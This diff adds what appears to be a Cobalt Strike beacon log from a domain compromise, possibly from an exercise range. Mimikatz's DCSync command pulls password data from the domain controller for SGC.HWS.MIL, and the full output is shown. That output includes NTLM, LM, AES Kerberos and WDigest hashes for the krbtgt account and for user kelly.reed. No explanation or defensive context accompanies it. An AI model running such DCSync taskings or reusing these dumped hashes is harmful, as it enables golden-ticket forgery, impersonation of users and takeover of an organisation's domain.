@@ -1,0 +1,156 @@
+[DC] 'SGC.HWS.MIL' will be the domain
+[DC] 'SGCDC001.SGC.HWS.MIL' will be the DC server
+[DC] 'SGC\krbtgt' will be the user account
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   : 
+Password last change : 10/21/2018 5:55:54 PM
+Object Security ID   : S-1-5-21-60804857-299774370-1069655206-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 7f139b155ececc8ba6a948bd71a903b9
+    ntlm- 0: 7f139b155ececc8ba6a948bd71a903b9
+    lm  - 0: 002954f2db5167f441418aa7a8847970
+
+Supplemental Credentials:
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : SGC.HWS.MILkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 8ec1b3343b683bac9fbb93a91db348afe2a23c2d6e96d85013c08817b2c1914c
+      aes128_hmac       (4096) : 53cbc42eeb1b9f1fd4802f6d588ff20b
+      des_cbc_md5       (4096) : 10abdada297f4cfe
+
+* Primary:Kerberos *
+    Default Salt : SGC.HWS.MILkrbtgt
+    Credentials
+      des_cbc_md5       : 10abdada297f4cfe
+
+* Packages *
+    Kerberos-Newer-Keys
+
+* Primary:WDigest *
+    01  5ee7e5354beddea02d68f3f3967db38e
+    02  9cf8db7ad2464804afc8c952d29fbf5f
+    03  f18a914c5455dcd74220364b3dad84fe
+    04  5ee7e5354beddea02d68f3f3967db38e
+    05  9cf8db7ad2464804afc8c952d29fbf5f
+    06  af3be2b95ce06307969478bfd2325048
+    07  5ee7e5354beddea02d68f3f3967db38e
+    08  e8e48010510add8df67c28c4cbcf75ff
+    09  a5108803e740fab49c5359492859689d
+    10  b695d0ab789de3a9f281c399d2f52c24
+    11  e8e48010510add8df67c28c4cbcf75ff
+    12  a5108803e740fab49c5359492859689d
+    13  0219f8b633f0287d5c3de0a12e6f1ae2
+    14  e8e48010510add8df67c28c4cbcf75ff
+    15  d3ab31405ea074dfd4911b76061b6f00
+    16  e24d6da99a90ea4e8bf768fad1ccbdf4
+    17  5fb0bd6330b60cede5e89506b7fcc9a5
+    18  1bf5e805ab56e3671570e29dae3df652
+    19  41b84addb63961a0dd770385a46526e7
+    20  8b84f0b347271e7f14f81484f074a307
+    21  284863cc1b4c7899117d4dd5e4d87fe9
+    22  284863cc1b4c7899117d4dd5e4d87fe9
+    23  3f90051172bd6a97e6bbd7fa9ef29ea7
+    24  fbe89302e29741d4992c938d0d91898f
+    25  a5b091ee698485fe3b8992ee4c2e5c3c
+    26  038c08ffa0e120614f22162a4893e238
+    27  fdc4860aad109503684bf6308512dee3
+    28  4307891660c1e5724de75803d9b2fd84
+    29  4405ad0593568ca144e3c24cd16deb31
+
+
+
+10/12 01:31:09 [input] <neo> dcsync SGC.HWS.MIL SGC\kelly.reed
+10/12 01:31:09 [task] Tasked beacon to run mimikatz's @lsadump::dcsync /domain:SGC.HWS.MIL /user:SGC\kelly.reed command
+10/12 01:31:17 [checkin] host called home, sent: 663114 bytes
+10/12 01:31:18 [output]
+received output:
+[DC] 'SGC.HWS.MIL' will be the domain
+[DC] 'SGCDC001.SGC.HWS.MIL' will be the DC server
+[DC] 'SGC\kelly.reed' will be the user account
+
+Object RDN           : Reed, Kelly LT
+
+** SAM ACCOUNT **
+
+SAM Username         : kelly.reed
+User Principal Name  : kelly.reed@SGC.HWS.MIL
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   : 
+Password last change : 10/21/2018 5:58:30 PM
+Object Security ID   : S-1-5-21-60804857-299774370-1069655206-1171
+Object Relative ID   : 1171
+
+Credentials:
+  Hash NTLM: b1f01d13cdb6fcf1792153512dcc0084
+    ntlm- 0: b1f01d13cdb6fcf1792153512dcc0084
+    ntlm- 1: d3b1baa375db421d57953d4ea092bf03
+    lm  - 0: 7041730dc797434ee0aeb998bca622fb
+    lm  - 1: 3cd8fbc32868d4e5ca82e650ecb3a8f8
+
+Supplemental Credentials:
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : SGC.HWS.MILkelly.reed
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 5cd27b010d890ccd6ef767d548322a10ed6297e488955cbe55792fdbbbfce2d4
+      aes128_hmac       (4096) : 7b157f729d6c16991218ada34139a428
+      des_cbc_md5       (4096) : 648f7f58fb1fc89d
+    OldCredentials
+      aes256_hmac       (4096) : 9e953ea6d1745922d5d339f9def0700b2207226bd0854b56e337d255832a2f1b
+      aes128_hmac       (4096) : e2d1ad687e683c9069f0206a958e6bc7
+      des_cbc_md5       (4096) : 853d97705dd357f1
+
+* Primary:Kerberos *
+    Default Salt : SGC.HWS.MILkelly.reed
+    Credentials
+      des_cbc_md5       : 648f7f58fb1fc89d
+    OldCredentials
+      des_cbc_md5       : 853d97705dd357f1
+
+* Packages *
+    Kerberos-Newer-Keys
+
+* Primary:WDigest *
+    01  25f76891e5852ff050b972df72d5d8bd
+    02  86fe7dea4de0e8ddb994b883b962389a
+    03  642ec745d16f9009c348242500adec62
+    04  25f76891e5852ff050b972df72d5d8bd
+    05  86fe7dea4de0e8ddb994b883b962389a
+    06  37a43aaa404fc01e56aef82bf8b7a5af
+    07  25f76891e5852ff050b972df72d5d8bd
+    08  5ad114e2091ab50f7f686152fe4c384e
+    09  b5b7f3f0ec19b8fbf0b8b8516f84e918
+    10  b2616b4dcfe46b73bea9011a483804f4
+    11  5ad114e2091ab50f7f686152fe4c384e
+    12  b5b7f3f0ec19b8fbf0b8b8516f84e918
+    13  67600483d61e5b3022c02e4eeeabe411
+    14  5ad114e2091ab50f7f686152fe4c384e
+    15  9bdfa0b0ed63300068dabcef7d609cbd
+    16  4cd2eb3b92fcf8249d3d6ba2515a9f9c
+    17  7e025650be405fdb82e6f0cc73e20c08
+    18  3f6cfd3d184e6fcf492fdaa0b47a304a
+    19  5412fd0b8b6722c03cc5b38099b6de1c
+    20  8f498b7c92ef24b637889d9fe7500f0c
+    21  0051ade3b4104812840fc555e02bdf41
+    22  0051ade3b4104812840fc555e02bdf41
+    23  5c488fcfa017184abe554ad9de55ddc0
+    24  a2dd91e79ea28e707f95fc6b56b8e79b
+    25  53203f83891a13a94833dbfb3f374d51
+    26  156379609e6c57b4091212139301266f
+    27  c159016c7cba4a2763ed3d02ba7b0233
+    28  f33c2c12e775d5ce0bcd6da3fa70fb30
+    29  92433d0159a35b7c1db00b8ae508a553
+
+
+
